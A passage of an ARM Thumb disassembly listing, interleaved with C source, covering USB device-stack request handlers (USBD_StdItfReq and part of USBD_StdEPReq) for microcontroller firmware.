 800b6ca:	f000 fd88 	bl	800c1de <USBD_CtlError>
          break;
 800b6ce:	bf00      	nop
      }
      break;
 800b6d0:	e004      	b.n	800b6dc <USBD_StdDevReq+0xd8>

    default:
      USBD_CtlError(pdev, req);
 800b6d2:	6839      	ldr	r1, [r7, #0]
 800b6d4:	6878      	ldr	r0, [r7, #4]
 800b6d6:	f000 fd82 	bl	800c1de <USBD_CtlError>
      break;
 800b6da:	bf00      	nop
  }

  return ret;
 800b6dc:	7bfb      	ldrb	r3, [r7, #15]
}
 800b6de:	4618      	mov	r0, r3
 800b6e0:	3710      	adds	r7, #16
 800b6e2:	46bd      	mov	sp, r7
 800b6e4:	bd80      	pop	{r7, pc}
 800b6e6:	bf00      	nop

0800b6e8 <USBD_StdItfReq>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
USBD_StatusTypeDef USBD_StdItfReq(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800b6e8:	b580      	push	{r7, lr}
 800b6ea:	b084      	sub	sp, #16
 800b6ec:	af00      	add	r7, sp, #0
 800b6ee:	6078      	str	r0, [r7, #4]
 800b6f0:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret = USBD_OK;
 800b6f2:	2300      	movs	r3, #0
 800b6f4:	73fb      	strb	r3, [r7, #15]
  uint8_t idx;

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 800b6f6:	683b      	ldr	r3, [r7, #0]
 800b6f8:	781b      	ldrb	r3, [r3, #0]
 800b6fa:	f003 0360 	and.w	r3, r3, #96	; 0x60
 800b6fe:	2b40      	cmp	r3, #64	; 0x40
 800b700:	d005      	beq.n	800b70e <USBD_StdItfReq+0x26>
 800b702:	2b40      	cmp	r3, #64	; 0x40
 800b704:	d852      	bhi.n	800b7ac <USBD_StdItfReq+0xc4>
 800b706:	2b00      	cmp	r3, #0
 800b708:	d001      	beq.n	800b70e <USBD_StdItfReq+0x26>
 800b70a:	2b20      	cmp	r3, #32
 800b70c:	d14e      	bne.n	800b7ac <USBD_StdItfReq+0xc4>
  {
    case USB_REQ_TYPE_CLASS:
    case USB_REQ_TYPE_VENDOR:
    case USB_REQ_TYPE_STANDARD:
      switch (pdev->dev_state)
 800b70e:	687b      	ldr	r3, [r7, #4]
 800b710:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b714:	b2db      	uxtb	r3, r3
 800b716:	3b01      	subs	r3, #1
 800b718:	2b02      	cmp	r3, #2
 800b71a:	d840      	bhi.n	800b79e <USBD_StdItfReq+0xb6>
      {
        case USBD_STATE_DEFAULT:
        case USBD_STATE_ADDRESSED:
        case USBD_STATE_CONFIGURED:

          if (LOBYTE(req->wIndex) <= USBD_MAX_NUM_INTERFACES)
 800b71c:	683b      	ldr	r3, [r7, #0]
 800b71e:	889b      	ldrh	r3, [r3, #4]
 800b720:	b2db      	uxtb	r3, r3
 800b722:	2b01      	cmp	r3, #1
 800b724:	d836      	bhi.n	800b794 <USBD_StdItfReq+0xac>
          {
            /* Get the class index relative to this interface */
            idx = USBD_CoreFindIF(pdev, LOBYTE(req->wIndex));
 800b726:	683b      	ldr	r3, [r7, #0]
 800b728:	889b      	ldrh	r3, [r3, #4]
 800b72a:	b2db      	uxtb	r3, r3
 800b72c:	4619      	mov	r1, r3
 800b72e:	6878      	ldr	r0, [r7, #4]
 800b730:	f7ff fed8 	bl	800b4e4 <USBD_CoreFindIF>
 800b734:	4603      	mov	r3, r0
 800b736:	73bb      	strb	r3, [r7, #14]
            if (((uint8_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b738:	7bbb      	ldrb	r3, [r7, #14]
 800b73a:	2bff      	cmp	r3, #255	; 0xff
 800b73c:	d01d      	beq.n	800b77a <USBD_StdItfReq+0x92>
 800b73e:	7bbb      	ldrb	r3, [r7, #14]
 800b740:	2b00      	cmp	r3, #0
 800b742:	d11a      	bne.n	800b77a <USBD_StdItfReq+0x92>
            {
              /* Call the class data out function to manage the request */
              if (pdev->pClass[idx]->Setup != NULL)
 800b744:	7bba      	ldrb	r2, [r7, #14]
 800b746:	687b      	ldr	r3, [r7, #4]
 800b748:	32ae      	adds	r2, #174	; 0xae
 800b74a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b74e:	689b      	ldr	r3, [r3, #8]
 800b750:	2b00      	cmp	r3, #0
 800b752:	d00f      	beq.n	800b774 <USBD_StdItfReq+0x8c>
              {
                pdev->classId = idx;
 800b754:	7bba      	ldrb	r2, [r7, #14]
 800b756:	687b      	ldr	r3, [r7, #4]
 800b758:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
                ret = (USBD_StatusTypeDef)(pdev->pClass[idx]->Setup(pdev, req));
 800b75c:	7bba      	ldrb	r2, [r7, #14]
 800b75e:	687b      	ldr	r3, [r7, #4]
 800b760:	32ae      	adds	r2, #174	; 0xae
 800b762:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b766:	689b      	ldr	r3, [r3, #8]
 800b768:	6839      	ldr	r1, [r7, #0]
 800b76a:	6878      	ldr	r0, [r7, #4]
 800b76c:	4798      	blx	r3
 800b76e:	4603      	mov	r3, r0
 800b770:	73fb      	strb	r3, [r7, #15]
              if (pdev->pClass[idx]->Setup != NULL)
 800b772:	e004      	b.n	800b77e <USBD_StdItfReq+0x96>
              }
              else
              {
                /* should never reach this condition */
                ret = USBD_FAIL;
 800b774:	2303      	movs	r3, #3
 800b776:	73fb      	strb	r3, [r7, #15]
              if (pdev->pClass[idx]->Setup != NULL)
 800b778:	e001      	b.n	800b77e <USBD_StdItfReq+0x96>
              }
            }
            else
            {
              /* No relative interface found */
              ret = USBD_FAIL;
 800b77a:	2303      	movs	r3, #3
 800b77c:	73fb      	strb	r3, [r7, #15]
            }

            if ((req->wLength == 0U) && (ret == USBD_OK))
 800b77e:	683b      	ldr	r3, [r7, #0]
 800b780:	88db      	ldrh	r3, [r3, #6]
 800b782:	2b00      	cmp	r3, #0
 800b784:	d110      	bne.n	800b7a8 <USBD_StdItfReq+0xc0>
 800b786:	7bfb      	ldrb	r3, [r7, #15]
 800b788:	2b00      	cmp	r3, #0
 800b78a:	d10d      	bne.n	800b7a8 <USBD_StdItfReq+0xc0>
            {
              (void)USBD_CtlSendStatus(pdev);
 800b78c:	6878      	ldr	r0, [r7, #4]
 800b78e:	f000 fdf1 	bl	800c374 <USBD_CtlSendStatus>
          }
          else
          {
            USBD_CtlError(pdev, req);
          }
          break;
 800b792:	e009      	b.n	800b7a8 <USBD_StdItfReq+0xc0>
            USBD_CtlError(pdev, req);
 800b794:	6839      	ldr	r1, [r7, #0]
 800b796:	6878      	ldr	r0, [r7, #4]
 800b798:	f000 fd21 	bl	800c1de <USBD_CtlError>
          break;
 800b79c:	e004      	b.n	800b7a8 <USBD_StdItfReq+0xc0>

        default:
          USBD_CtlError(pdev, req);
 800b79e:	6839      	ldr	r1, [r7, #0]
 800b7a0:	6878      	ldr	r0, [r7, #4]
 800b7a2:	f000 fd1c 	bl	800c1de <USBD_CtlError>
          break;
 800b7a6:	e000      	b.n	800b7aa <USBD_StdItfReq+0xc2>
          break;
 800b7a8:	bf00      	nop
      }
      break;
 800b7aa:	e004      	b.n	800b7b6 <USBD_StdItfReq+0xce>

    default:
      USBD_CtlError(pdev, req);
 800b7ac:	6839      	ldr	r1, [r7, #0]
 800b7ae:	6878      	ldr	r0, [r7, #4]
 800b7b0:	f000 fd15 	bl	800c1de <USBD_CtlError>
      break;
 800b7b4:	bf00      	nop
  }

  return ret;
 800b7b6:	7bfb      	ldrb	r3, [r7, #15]
}
 800b7b8:	4618      	mov	r0, r3
 800b7ba:	3710      	adds	r7, #16
 800b7bc:	46bd      	mov	sp, r7
 800b7be:	bd80      	pop	{r7, pc}

0800b7c0 <USBD_StdEPReq>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
USBD_StatusTypeDef USBD_StdEPReq(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800b7c0:	b580      	push	{r7, lr}
 800b7c2:	b084      	sub	sp, #16
 800b7c4:	af00      	add	r7, sp, #0
 800b7c6:	6078      	str	r0, [r7, #4]
 800b7c8:	6039      	str	r1, [r7, #0]
  USBD_EndpointTypeDef *pep;
  uint8_t ep_addr;
  uint8_t idx;
  USBD_StatusTypeDef ret = USBD_OK;
 800b7ca:	2300      	movs	r3, #0
 800b7cc:	73fb      	strb	r3, [r7, #15]

  ep_addr = LOBYTE(req->wIndex);
 800b7ce:	683b      	ldr	r3, [r7, #0]
 800b7d0:	889b      	ldrh	r3, [r3, #4]
 800b7d2:	73bb      	strb	r3, [r7, #14]

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 800b7d4:	683b      	ldr	r3, [r7, #0]
 800b7d6:	781b      	ldrb	r3, [r3, #0]
 800b7d8:	f003 0360 	and.w	r3, r3, #96	; 0x60
 800b7dc:	2b40      	cmp	r3, #64	; 0x40
 800b7de:	d007      	beq.n	800b7f0 <USBD_StdEPReq+0x30>
 800b7e0:	2b40      	cmp	r3, #64	; 0x40
 800b7e2:	f200 817f 	bhi.w	800bae4 <USBD_StdEPReq+0x324>
 800b7e6:	2b00      	cmp	r3, #0
 800b7e8:	d02a      	beq.n	800b840 <USBD_StdEPReq+0x80>
 800b7ea:	2b20      	cmp	r3, #32
 800b7ec:	f040 817a 	bne.w	800bae4 <USBD_StdEPReq+0x324>
  {
    case USB_REQ_TYPE_CLASS:
    case USB_REQ_TYPE_VENDOR:
      /* Get the class index relative to this endpoint */
      idx = USBD_CoreFindEP(pdev, ep_addr);
 800b7f0:	7bbb      	ldrb	r3, [r7, #14]
 800b7f2:	4619      	mov	r1, r3
 800b7f4:	6878      	ldr	r0, [r7, #4]
 800b7f6:	f7ff fe82 	bl	800b4fe <USBD_CoreFindEP>
 800b7fa:	4603      	mov	r3, r0
 800b7fc:	737b      	strb	r3, [r7, #13]
      if (((uint8_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b7fe:	7b7b      	ldrb	r3, [r7, #13]
 800b800:	2bff      	cmp	r3, #255	; 0xff
 800b802:	f000 8174 	beq.w	800baee <USBD_StdEPReq+0x32e>
 800b806:	7b7b      	ldrb	r3, [r7, #13]
 800b808:	2b00      	cmp	r3, #0
 800b80a:	f040 8170 	bne.w	800baee <USBD_StdEPReq+0x32e>
      {
        pdev->classId = idx;
 800b80e:	7b7a      	ldrb	r2, [r7, #13]
 800b810:	687b      	ldr	r3, [r7, #4]
 800b812:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
        /* Call the class data out function to manage the request */
        if (pdev->pClass[idx]->Setup != NULL)
 800b816:	7b7a      	ldrb	r2, [r7, #13]
 800b818:	687b      	ldr	r3, [r7, #4]
 800b81a:	32ae      	adds	r2, #174	; 0xae
 800b81c:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b820:	689b      	ldr	r3, [r3, #8]
 800b822:	2b00      	cmp	r3, #0
 800b824:	f000 8163 	beq.w	800baee <USBD_StdEPReq+0x32e>
        {
          ret = (USBD_StatusTypeDef)pdev->pClass[idx]->Setup(pdev, req);
 800b828:	7b7a      	ldrb	r2, [r7, #13]
 800b82a:	687b      	ldr	r3, [r7, #4]
 800b82c:	32ae      	adds	r2, #174	; 0xae
 800b82e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b832:	689b      	ldr	r3, [r3, #8]
 800b834:	6839      	ldr	r1, [r7, #0]
 800b836:	6878      	ldr	r0, [r7, #4]
 800b838:	4798      	blx	r3
 800b83a:	4603      	mov	r3, r0
 800b83c:	73fb      	strb	r3, [r7, #15]
        }
      }
      break;
 800b83e:	e156      	b.n	800baee <USBD_StdEPReq+0x32e>

    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 800b840:	683b      	ldr	r3, [r7, #0]
 800b842:	785b      	ldrb	r3, [r3, #1]
 800b844:	2b03      	cmp	r3, #3
 800b846:	d008      	beq.n	800b85a <USBD_StdEPReq+0x9a>
 800b848:	2b03      	cmp	r3, #3
 800b84a:	f300 8145 	bgt.w	800bad8 <USBD_StdEPReq+0x318>
 800b84e:	2b00      	cmp	r3, #0
 800b850:	f000 809b 	beq.w	800b98a <USBD_StdEPReq+0x1ca>
 800b854:	2b01      	cmp	r3, #1
 800b856:	d03c      	beq.n	800b8d2 <USBD_StdEPReq+0x112>
 800b858:	e13e      	b.n	800bad8 <USBD_StdEPReq+0x318>
      {
        case USB_REQ_SET_FEATURE:
          switch (pdev->dev_state)
 800b85a:	687b      	ldr	r3, [r7, #4]
 800b85c:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b860:	b2db      	uxtb	r3, r3
 800b862:	2b02      	cmp	r3, #2
 800b864:	d002      	beq.n	800b86c <USBD_StdEPReq+0xac>
 800b866:	2b03      	cmp	r3, #3
 800b868:	d016      	beq.n	800b898 <USBD_StdEPReq+0xd8>
 800b86a:	e02c      	b.n	800b8c6 <USBD_StdEPReq+0x106>
          {
            case USBD_STATE_ADDRESSED:
              if ((ep_addr != 0x00U) && (ep_addr != 0x80U))
 800b86c:	7bbb      	ldrb	r3, [r7, #14]
 800b86e:	2b00      	cmp	r3, #0
 800b870:	d00d      	beq.n	800b88e <USBD_StdEPReq+0xce>
 800b872:	7bbb      	ldrb	r3, [r7, #14]
 800b874:	2b80      	cmp	r3, #128	; 0x80
 800b876:	d00a      	beq.n	800b88e <USBD_StdEPReq+0xce>
              {
                (void)USBD_LL_StallEP(pdev, ep_addr);
 800b878:	7bbb      	ldrb	r3, [r7, #14]
 800b87a:	4619      	mov	r1, r3
 800b87c:	6878      	ldr	r0, [r7, #4]
 800b87e:	f001 fa21 	bl	800ccc4 <USBD_LL_StallEP>
                (void)USBD_LL_StallEP(pdev, 0x80U);
 800b882:	2180      	movs	r1, #128	; 0x80
 800b884:	6878      	ldr	r0, [r7, #4]
 800b886:	f001 fa1d 	bl	800ccc4 <USBD_LL_StallEP>
 800b88a:	bf00      	nop
              }
              else
              {
                USBD_CtlError(pdev, req);
              }
              break;
 800b88c:	e020      	b.n	800b8d0 <USBD_StdEPReq+0x110>
                USBD_CtlError(pdev, req);
 800b88e:	6839      	ldr	r1, [r7, #0]
 800b890:	6878      	ldr	r0, [r7, #4]
 800b892:	f000 fca4 	bl	800c1de <USBD_CtlError>
              break;
 800b896:	e01b      	b.n	800b8d0 <USBD_StdEPReq+0x110>

            case USBD_STATE_CONFIGURED:
              if (req->wValue == USB_FEATURE_EP_HALT)
 800b898:	683b      	ldr	r3, [r7, #0]
 800b89a:	885b      	ldrh	r3, [r3, #2]
 800b89c:	2b00      	cmp	r3, #0
 800b89e:	d10e      	bne.n	800b8be <USBD_StdEPReq+0xfe>
              {
                if ((ep_addr != 0x00U) && (ep_addr != 0x80U) && (req->wLength == 0x00U))
 800b8a0:	7bbb      	ldrb	r3, [r7, #14]
 800b8a2:	2b00      	cmp	r3, #0
 800b8a4:	d00b      	beq.n	800b8be <USBD_StdEPReq+0xfe>
 800b8a6:	7bbb      	ldrb	r3, [r7, #14]
 800b8a8:	2b80      	cmp	r3, #128	; 0x80
 800b8aa:	d008      	beq.n	800b8be <USBD_StdEPReq+0xfe>
 800b8ac:	683b      	ldr	r3, [r7, #0]
 800b8ae:	88db      	ldrh	r3, [r3, #6]
 800b8b0:	2b00      	cmp	r3, #0
 800b8b2:	d104      	bne.n	800b8be <USBD_StdEPReq+0xfe>
                {
                  (void)USBD_LL_StallEP(pdev, ep_addr);
 800b8b4:	7bbb      	ldrb	r3, [r7, #14]
 800b8b6:	4619      	mov	r1, r3
 800b8b8:	6878      	ldr	r0, [r7, #4]
 800b8ba:	f001 fa03 	bl	800ccc4 <USBD_LL_StallEP>
                }
              }
              (void)USBD_CtlSendStatus(pdev);
 800b8be:	6878      	ldr	r0, [r7, #4]
 800b8c0:	f000 fd58 	bl	800c374 <USBD_CtlSendStatus>

              break;
 800b8c4:	e004      	b.n	800b8d0 <USBD_StdEPReq+0x110>

            default:
              USBD_CtlError(pdev, req);
 800b8c6:	6839      	ldr	r1, [r7, #0]
 800b8c8:	6878      	ldr	r0, [r7, #4]
 800b8ca:	f000 fc88 	bl	800c1de <USBD_CtlError>
              break;
 800b8ce:	bf00      	nop
          }
          break;
 800b8d0:	e107      	b.n	800bae2 <USBD_StdEPReq+0x322>

        case USB_REQ_CLEAR_FEATURE:

          switch (pdev->dev_state)
 800b8d2:	687b      	ldr	r3, [r7, #4]
 800b8d4:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b8d8:	b2db      	uxtb	r3, r3
 800b8da:	2b02      	cmp	r3, #2
 800b8dc:	d002      	beq.n	800b8e4 <USBD_StdEPReq+0x124>
 800b8de:	2b03      	cmp	r3, #3
 800b8e0:	d016      	beq.n	800b910 <USBD_StdEPReq+0x150>
 800b8e2:	e04b      	b.n	800b97c <USBD_StdEPReq+0x1bc>
          {
            case USBD_STATE_ADDRESSED:
              if ((ep_addr != 0x00U) && (ep_addr != 0x80U))
 800b8e4:	7bbb      	ldrb	r3, [r7, #14]
 800b8e6:	2b00      	cmp	r3, #0
 800b8e8:	d00d      	beq.n	800b906 <USBD_StdEPReq+0x146>
 800b8ea:	7bbb      	ldrb	r3, [r7, #14]
 800b8ec:	2b80      	cmp	r3, #128	; 0x80
 800b8ee:	d00a      	beq.n	800b906 <USBD_StdEPReq+0x146>
              {
                (void)USBD_LL_StallEP(pdev, ep_addr);
 800b8f0:	7bbb      	ldrb	r3, [r7, #14]
 800b8f2:	4619      	mov	r1, r3
 800b8f4:	6878      	ldr	r0, [r7, #4]
 800b8f6:	f001 f9e5 	bl	800ccc4 <USBD_LL_StallEP>
                (void)USBD_LL_StallEP(pdev, 0x80U);
 800b8fa:	2180      	movs	r1, #128	; 0x80
 800b8fc:	6878      	ldr	r0, [r7, #4]
 800b8fe:	f001 f9e1 	bl	800ccc4 <USBD_LL_StallEP>
 800b902:	bf00      	nop
              }
              else
              {
                USBD_CtlError(pdev, req);
              }
              break;
 800b904:	e040      	b.n	800b988 <USBD_StdEPReq+0x1c8>
                USBD_CtlError(pdev, req);
 800b906:	6839      	ldr	r1, [r7, #0]
 800b908:	6878      	ldr	r0, [r7, #4]
 800b90a:	f000 fc68 	bl	800c1de <USBD_CtlError>
              break;
 800b90e:	e03b      	b.n	800b988 <USBD_StdEPReq+0x1c8>

            case USBD_STATE_CONFIGURED:
              if (req->wValue == USB_FEATURE_EP_HALT)
 800b910:	683b      	ldr	r3, [r7, #0]
 800b912:	885b      	ldrh	r3, [r3, #2]
 800b914:	2b00      	cmp	r3, #0
 800b916:	d136      	bne.n	800b986 <USBD_StdEPReq+0x1c6>
              {
                if ((ep_addr & 0x7FU) != 0x00U)
 800b918:	7bbb      	ldrb	r3, [r7, #14]
 800b91a:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800b91e:	2b00      	cmp	r3, #0
 800b920:	d004      	beq.n	800b92c <USBD_StdEPReq+0x16c>
                {
                  (void)USBD_LL_ClearStallEP(pdev, ep_addr);
 800b922:	7bbb      	ldrb	r3, [r7, #14]
 800b924:	4619      	mov	r1, r3
 800b926:	6878      	ldr	r0, [r7, #4]
 800b928:	f001 fa02 	bl	800cd30 <USBD_LL_ClearStallEP>
                }
                (void)USBD_CtlSendStatus(pdev);
 800b92c:	6878      	ldr	r0, [r7, #4]
 800b92e:	f000 fd21 	bl	800c374 <USBD_CtlSendStatus>

                /* Get the class index relative to this interface */
                idx = USBD_CoreFindEP(pdev, ep_addr);
 800b932:	7bbb      	ldrb	r3, [r7, #14]
 800b934:	4619      	mov	r1, r3
 800b936:	6878      	ldr	r0, [r7, #4]
 800b938:	f7ff fde1 	bl	800b4fe <USBD_CoreFindEP>
 800b93c:	4603      	mov	r3, r0
 800b93e:	737b      	strb	r3, [r7, #13]
                if (((uint8_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b940:	7b7b      	ldrb	r3, [r7, #13]
 800b942:	2bff      	cmp	r3, #255	; 0xff
 800b944:	d01f      	beq.n	800b986 <USBD_StdEPReq+0x1c6>
 800b946:	7b7b      	ldrb	r3, [r7, #13]
 800b948:	2b00      	cmp	r3, #0
 800b94a:	d11c      	bne.n	800b986 <USBD_StdEPReq+0x1c6>
                {
                  pdev->classId = idx;
 800b94c:	7b7a      	ldrb	r2, [r7, #13]
 800b94e:	687b      	ldr	r3, [r7, #4]
 800b950:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
                  /* Call the class data out function to manage the request */
                  if (pdev->pClass[idx]->Setup != NULL)
 800b954:	7b7a      	ldrb	r2, [r7, #13]
 800b956:	687b      	ldr	r3, [r7, #4]
 800b958:	32ae      	adds	r2, #174	; 0xae
 800b95a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b95e:	689b      	ldr	r3, [r3, #8]
 800b960:	2b00      	cmp	r3, #0
 800b962:	d010      	beq.n	800b986 <USBD_StdEPReq+0x1c6>
                  {
                    ret = (USBD_StatusTypeDef)(pdev->pClass[idx]->Setup(pdev, req));
 800b964:	7b7a      	ldrb	r2, [r7, #13]
 800b966:	687b      	ldr	r3, [r7, #4]
 800b968:	32ae      	adds	r2, #174	; 0xae
 800b96a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b96e:	689b      	ldr	r3, [r3, #8]
 800b970:	6839      	ldr	r1, [r7, #0]
 800b972:	6878      	ldr	r0, [r7, #4]
 800b974:	4798      	blx	r3
 800b976:	4603      	mov	r3, r0
 800b978:	73fb      	strb	r3, [r7, #15]
                  }
                }
              }
              break;
 800b97a:	e004      	b.n	800b986 <USBD_StdEPReq+0x1c6>

            default:
              USBD_CtlError(pdev, req);
 800b97c:	6839      	ldr	r1, [r7, #0]
 800b97e:	6878      	ldr	r0, [r7, #4]
 800b980:	f000 fc2d 	bl	800c1de <USBD_CtlError>
              break;
 800b984:	e000      	b.n	800b988 <USBD_StdEPReq+0x1c8>
              break;
 800b986:	bf00      	nop
          }
          break;
 800b988:	e0ab      	b.n	800bae2 <USBD_StdEPReq+0x322>

        case USB_REQ_GET_STATUS:
          switch (pdev->dev_state)
 800b98a:	687b      	ldr	r3, [r7, #4]
 800b98c:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b990:	b2db      	uxtb	r3, r3
 800b992:	2b02      	cmp	r3, #2
 800b994:	d002      	beq.n	800b99c <USBD_StdEPReq+0x1dc>
 800b996:	2b03      	cmp	r3, #3
 800b998:	d032      	beq.n	800ba00 <USBD_StdEPReq+0x240>
 800b99a:	e097      	b.n	800bacc <USBD_StdEPReq+0x30c>
          {
            case USBD_STATE_ADDRESSED:
              if ((ep_addr != 0x00U) && (ep_addr != 0x80U))
 800b99c:	7bbb      	ldrb	r3, [r7, #14]
 800b99e:	2b00      	cmp	r3, #0
 800b9a0:	d007      	beq.n	800b9b2 <USBD_StdEPReq+0x1f2>
 800b9a2:	7bbb      	ldrb	r3, [r7, #14]
 800b9a4:	2b80      	cmp	r3, #128	; 0x80
 800b9a6:	d004      	beq.n	800b9b2 <USBD_StdEPReq+0x1f2>
              {
                USBD_CtlError(pdev, req);
 800b9a8:	6839      	ldr	r1, [r7, #0]
 800b9aa:	6878      	ldr	r0, [r7, #4]
 800b9ac:	f000 fc17 	bl	800c1de <USBD_CtlError>
                break;
 800b9b0:	e091      	b.n	800bad6 <USBD_StdEPReq+0x316>
              }
              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800b9b2:	f997 300e 	ldrsb.w	r3, [r7, #14]
 800b9b6:	2b00      	cmp	r3, #0
 800b9b8:	da0b      	bge.n	800b9d2 <USBD_StdEPReq+0x212>
 800b9ba:	7bbb      	ldrb	r3, [r7, #14]
 800b9bc:	f003 027f 	and.w	r2, r3, #127	; 0x7f
 800b9c0:	4613      	mov	r3, r2
 800b9c2:	009b      	lsls	r3, r3, #2
 800b9c4:	4413      	add	r3, r2
 800b9c6:	009b      	lsls	r3, r3, #2
 800b9c8:	3310      	adds	r3, #16
 800b9ca:	687a      	ldr	r2, [r7, #4]
 800b9cc:	4413      	add	r3, r2
 800b9ce:	3304      	adds	r3, #4
 800b9d0:	e00b      	b.n	800b9ea <USBD_StdEPReq+0x22a>
                    &pdev->ep_out[ep_addr & 0x7FU];
 800b9d2:	7bbb      	ldrb	r3, [r7, #14]
 800b9d4:	f003 027f 	and.w	r2, r3, #127	; 0x7f
              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800b9d8:	4613      	mov	r3, r2
 800b9da:	009b      	lsls	r3, r3, #2
 800b9dc:	4413      	add	r3, r2
 800b9de:	009b      	lsls	r3, r3, #2
 800b9e0:	f503 73a8 	add.w	r3, r3, #336	; 0x150
 800b9e4:	687a      	ldr	r2, [r7, #4]
 800b9e6:	4413      	add	r3, r2
 800b9e8:	3304      	adds	r3, #4
 800b9ea:	60bb      	str	r3, [r7, #8]

              pep->status = 0x0000U;
 800b9ec:	68bb      	ldr	r3, [r7, #8]
 800b9ee:	2200      	movs	r2, #0
 800b9f0:	601a      	str	r2, [r3, #0]

              (void)USBD_CtlSendData(pdev, (uint8_t *)&pep->status, 2U);
 800b9f2:	68bb      	ldr	r3, [r7, #8]
 800b9f4:	2202      	movs	r2, #2
 800b9f6:	4619      	mov	r1, r3
 800b9f8:	6878      	ldr	r0, [r7, #4]
 800b9fa:	f000 fc61 	bl	800c2c0 <USBD_CtlSendData>
              break;
 800b9fe:	e06a      	b.n	800bad6 <USBD_StdEPReq+0x316>

            case USBD_STATE_CONFIGURED:
              if ((ep_addr & 0x80U) == 0x80U)
 800ba00:	f997 300e 	ldrsb.w	r3, [r7, #14]
 800ba04:	2b00      	cmp	r3, #0
 800ba06:	da11      	bge.n	800ba2c <USBD_StdEPReq+0x26c>
              {
                if (pdev->ep_in[ep_addr & 0xFU].is_used == 0U)
 800ba08:	7bbb      	ldrb	r3, [r7, #14]
 800ba0a:	f003 020f 	and.w	r2, r3, #15
 800ba0e:	6879      	ldr	r1, [r7, #4]
 800ba10:	4613      	mov	r3, r2
 800ba12:	009b      	lsls	r3, r3, #2
 800ba14:	4413      	add	r3, r2
 800ba16:	009b      	lsls	r3, r3, #2
 800ba18:	440b      	add	r3, r1
 800ba1a:	3324      	adds	r3, #36	; 0x24
 800ba1c:	881b      	ldrh	r3, [r3, #0]
 800ba1e:	2b00      	cmp	r3, #0
 800ba20:	d117      	bne.n	800ba52 <USBD_StdEPReq+0x292>
                {
                  USBD_CtlError(pdev, req);
 800ba22:	6839      	ldr	r1, [r7, #0]
 800ba24:	6878      	ldr	r0, [r7, #4]
 800ba26:	f000 fbda 	bl	800c1de <USBD_CtlError>
                  break;
 800ba2a:	e054      	b.n	800bad6 <USBD_StdEPReq+0x316>
                }
              }
              else
              {
                if (pdev->ep_out[ep_addr & 0xFU].is_used == 0U)
 800ba2c:	7bbb      	ldrb	r3, [r7, #14]
 800ba2e:	f003 020f 	and.w	r2, r3, #15
 800ba32:	6879      	ldr	r1, [r7, #4]
 800ba34:	4613      	mov	r3, r2
 800ba36:	009b      	lsls	r3, r3, #2
 800ba38:	4413      	add	r3, r2
 800ba3a:	009b      	lsls	r3, r3, #2
 800ba3c:	440b      	add	r3, r1
 800ba3e:	f503 73b2 	add.w	r3, r3, #356	; 0x164
 800ba42:	881b      	ldrh	r3, [r3, #0]
 800ba44:	2b00      	cmp	r3, #0
 800ba46:	d104      	bne.n	800ba52 <USBD_StdEPReq+0x292>
                {
                  USBD_CtlError(pdev, req);
 800ba48:	6839      	ldr	r1, [r7, #0]
 800ba4a:	6878      	ldr	r0, [r7, #4]
 800ba4c:	f000 fbc7 	bl	800c1de <USBD_CtlError>
                  break;
 800ba50:	e041      	b.n	800bad6 <USBD_StdEPReq+0x316>
                }
              }

              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800ba52:	f997 300e 	ldrsb.w	r3, [r7, #14]
 800ba56:	2b00      	cmp	r3, #0
 800ba58:	da0b      	bge.n	800ba72 <USBD_StdEPReq+0x2b2>
 800ba5a:	7bbb      	ldrb	r3, [r7, #14]
 800ba5c:	f003 027f 	and.w	r2, r3, #127	; 0x7f
 800ba60:	4613      	mov	r3, r2
 800ba62:	009b      	lsls	r3, r3, #2
 800ba64:	4413      	add	r3, r2
 800ba66:	009b      	lsls	r3, r3, #2
 800ba68:	3310      	adds	r3, #16
 800ba6a:	687a      	ldr	r2, [r7, #4]
 800ba6c:	4413      	add	r3, r2
 800ba6e:	3304      	adds	r3, #4
 800ba70:	e00b      	b.n	800ba8a <USBD_StdEPReq+0x2ca>
                    &pdev->ep_out[ep_addr & 0x7FU];
 800ba72:	7bbb      	ldrb	r3, [r7, #14]
 800ba74:	f003 027f 	and.w	r2, r3, #127	; 0x7f
              pep = ((ep_addr & 0x80U) == 0x80U) ? &pdev->ep_in[ep_addr & 0x7FU] : \
 800ba78:	4613      	mov	r3, r2
 800ba7a:	009b      	lsls	r3, r3, #2
 800ba7c:	4413      	add	r3, r2
 800ba7e:	009b      	lsls	r3, r3, #2
 800ba80:	f503 73a8 	add.w	r3, r3, #336	; 0x150
 800ba84:	687a      	ldr	r2, [r7, #4]
 800ba86:	4413      	add	r3, r2
 800ba88:	3304      	adds	r3, #4
 800ba8a:	60bb      	str	r3, [r7, #8]

              if ((ep_addr == 0x00U) || (ep_addr == 0x80U))
 800ba8c:	7bbb      	ldrb	r3, [r7, #14]
 800ba8e:	2b00      	cmp	r3, #0
